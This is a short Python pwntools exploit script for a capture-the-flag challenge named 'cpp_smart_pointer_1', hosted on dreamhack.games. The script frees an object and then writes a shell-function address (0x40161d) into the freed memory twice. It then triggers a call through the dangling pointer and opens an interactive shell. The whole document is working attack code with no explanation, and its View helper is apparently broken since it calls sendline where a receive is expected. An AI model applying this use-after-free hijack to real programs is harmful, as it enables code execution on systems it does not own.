from pwn import *
def Delete(num):
	p.sendlineafter(': ', '2')
	p.sendlineafter(': ', str(num))
def Write(contents):
	p.sendlineafter(': ', '4')
	p.sendlineafter('guestbook : ', contents)
def View():
	p.sendlineafter(': ', '5')
	p.recvuntil('data: ')
	return p.sendline().replace('\n', '') 
def Test(num):
	p.sendlineafter(': ', '3')
	p.sendlineafter(': ', str(num))
	
context.update(log_level='debug')

#p = process('cpp_smart_pointer_1')
p = remote('host1.dreamhack.games', 15550)

Delete(1)
addr_shell = 0x40161d
addr_s_shell = hex(addr_shell)[2:].decode('hex')

Write(addr_s_shell[::-1] + '\x00'*(7 - len(addr_s_shell)))
Write(addr_s_shell[::-1] + '\x00'*(7 - len(addr_s_shell)))
Test(2)

p.interactive()
